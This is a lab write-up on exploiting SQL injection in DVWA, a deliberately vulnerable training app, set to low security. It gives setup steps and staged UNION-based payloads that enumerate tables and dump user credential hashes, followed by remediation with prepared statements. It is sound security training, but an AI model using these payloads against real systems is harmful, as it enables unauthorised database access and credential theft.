# Task 3: SQL Injection on DVWA (Low Security)

**Author:** Maitrik  
**Tools:** DVWA, curl, Burp Suite (optional)  
**Security Level:** Low  

---

## Objective

Demonstrate a classic SQL Injection (SQLi) vulnerability on the DVWA (Damn Vulnerable Web Application) running at low security. Extract the DBMS version, database name, table names, and user credential hashes from the backend database without any authentication.

---

## What is SQL Injection?

**SQL Injection (SQLi)** is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. By inserting (injecting) malicious SQL syntax into input fields, an attacker can:

- **Bypass authentication** — log in without valid credentials
- **Extract data** — dump tables, usernames, password hashes, PII
- **Modify data** — insert, update, or delete database records
- **Execute OS commands** — on misconfigured databases (e.g., `xp_cmdshell` on MSSQL)

**Root Cause:** The application constructs SQL queries by directly concatenating user input without sanitization or parameterization.

**Vulnerable Query Example (PHP):**
```php
$query = "SELECT * FROM users WHERE id = '$id'";
```
When `$id` = `1' OR '1'='1`, the query becomes:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```
Since `'1'='1'` is always true, the query returns **all rows** in the table.

---

## Lab Setup

### Prerequisites
- A machine running Linux (Kali recommended) or Windows with XAMPP
- PHP, Apache, MySQL (bundled in XAMPP or LAMP stack)
- DVWA source code

### Step-by-Step DVWA Installation

#### Option A: XAMPP (Windows/Linux)
```bash
# Download XAMPP from https://www.apachefriends.org
# After installation, place DVWA in the htdocs folder

cd /opt/lampp/htdocs
git clone https://github.com/digininja/DVWA.git dvwa

# Copy and edit config
cp dvwa/config/config.inc.php.dist dvwa/config/config.inc.php
nano dvwa/config/config.inc.php
# Set: $_DVWA['db_password'] = '';

# Start XAMPP
/opt/lampp/lampp start
```

#### Option B: Docker (Quickest)
```bash
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
# Access: http://localhost/
```

#### Option C: Kali Linux (Native LAMP)
```bash
sudo apt update && sudo apt install -y apache2 mariadb-server php php-mysqli
git clone https://github.com/digininja/DVWA /var/www/html/dvwa
cp /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php
sudo systemctl start apache2 mariadb
# Visit http://localhost/dvwa/setup.php -> click "Create / Reset Database"
```

### Set Security Level to Low
1. Navigate to `http://localhost/dvwa`
2. Login: `admin` / `password`
3. Go to **DVWA Security** in the left menu
4. Set level to **Low** → click **Submit**

---

## Attack Walkthrough

### Target URL
```
http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```
The `id` parameter is passed directly into a SQL query — it is the injection point.

---

### Stage 1: Confirm Injection Point

Input a single quote to break the SQL syntax:

**Payload:**
```
1'
```
**URL:**
```
http://localhost/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit
```
**Expected Response:**
```
You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''1''' at line 1
```
✅ The error confirms the parameter is injectable.

---

### Stage 2: Always-True Injection (Authentication Bypass Logic)

**Payload:**
```
1' OR '1'='1
```
**Effect:** Returns all rows from the users table — every user's first name and surname is displayed.

---

### Stage 3: Determine Column Count (ORDER BY)

```
1' ORDER BY 1-- -    → No error
1' ORDER BY 2-- -    → No error
1' ORDER BY 3-- -    → Error: Unknown column '3'
```
**Result:** Query returns **2 columns**.

---

### Stage 4: UNION SELECT — Find Reflected Columns

**Payload:**
```
1' UNION SELECT NULL,NULL-- -
```
Confirms both columns are reflected in the output (First Name = col1, Surname = col2).

---

### Stage 5: Extract Database Version and Name

**Payload:**
```
1' UNION SELECT @@version, database()-- -
```
**Sample Output:**
```
First name: 8.0.31
Surname: dvwa
```
- **@@version** → MySQL version running on the server
- **database()** → Current database name: `dvwa`

---

### Stage 6: Enumerate Tables

**Payload:**
```
1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```
**Sample Output:**
```
First name: guestbook
First name: users
```

---

### Stage 7: Enumerate Columns in `users`

**Payload:**
```
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```
**Sample Output:**
```
user_id, first_name, last_name, user, password, avatar, last_login, failed_login
```

---

### Stage 8: Dump Credentials

**Payload:**
```
1' UNION SELECT user, password FROM users-- -
```
**Sample Output:**

| Username | Password Hash (MD5) |
|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

> **Note:** These are MD5 hashes. They can be cracked using tools like `john`, `hashcat`, or online databases like CrackStation.
> `5f4dcc3b5aa765d61d8327deb882cf99` → `password`

---

## Running the Exploit Script

```bash
# Make executable
chmod +x sql_injection_exploit.sh

# Run against local DVWA
./sql_injection_exploit.sh http://localhost/dvwa

# Run against custom DVWA URL
./sql_injection_exploit.sh http://192.168.1.100/dvwa
```

The script will:
1. Authenticate to DVWA
2. Set security level to Low
3. Run all injection stages automatically
4. Print extracted DB version, name, tables, columns, and credential hashes
5. Save full output to `sqli_results_<timestamp>.txt`

---

## Screenshots

| # | Screenshot | Description |
|---|---|---|
| 1 | `screenshots/01_dvwa_login.png` | DVWA login page |
| 2 | `screenshots/02_security_low.png` | Security level set to Low |
| 3 | `screenshots/03_sqli_page.png` | SQLi vulnerability page with input field |
| 4 | `screenshots/04_syntax_error.png` | SQL error confirming injection point (`1'`) |
| 5 | `screenshots/05_always_true.png` | All users returned with `1' OR '1'='1` |
| 6 | `screenshots/06_union_version.png` | DB version and name extracted via UNION |
| 7 | `screenshots/07_table_enum.png` | Table enumeration from information_schema |
| 8 | `screenshots/08_credential_dump.png` | Usernames and MD5 hashes dumped |
| 9 | `screenshots/09_script_output.png` | Terminal output of `sql_injection_exploit.sh` |

> **To capture screenshots:** Use `scrot`, `gnome-screenshot`, or Burp Suite's built-in screenshotting on each stage above.

---

## Vulnerability Explanation

### Why is this Vulnerable?

DVWA (Low Security) builds the SQL query like this (from the source):

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

User input is inserted **directly** into the query string with no:
- Input sanitization
- Parameterized queries / prepared statements
- Stored procedure abstraction
- WAF or input length restriction

### The Fix — Prepared Statements (Parameterized Queries)

```php
// VULNERABLE (Low Security — DVWA)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

// SECURE — Prepared Statement (PHP PDO)
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

With a prepared statement, user input is **never interpreted as SQL** — it is always treated as a data value. `1' OR '1'='1` becomes a literal string that matches no `user_id`, returning zero results safely.

### Additional Remediations

| Control | Description |
|---|---|
| **Parameterized Queries** | Primary fix — never concatenate user input into SQL |
| **Input Validation** | Whitelist expected input types (e.g., `id` must be integer) |
| **Least Privilege** | DB user should only have SELECT on needed tables — not DBA |
| **Error Handling** | Never expose raw SQL errors to users |
| **WAF** | Web Application Firewall to detect/block SQLi patterns |
| **ORM Usage** | Use an ORM (SQLAlchemy, Hibernate, Sequelize) that parameterizes by default |

---

## OWASP Classification

- **OWASP Top 10 2021:** A03:2021 — Injection
- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
- **CVSSv3 Base Score (generic SQLi):** 9.8 (Critical) — Network, Low complexity, No privileges, No interaction

---

## Disclaimer

> This demonstration was performed on DVWA — a deliberately vulnerable application designed for security training. All techniques shown are for **educational purposes only**. Performing SQL injection on systems without explicit written permission is illegal under the Computer Fraud and Abuse Act (CFAA), IT Act 2000 (India), and equivalent laws globally.

---
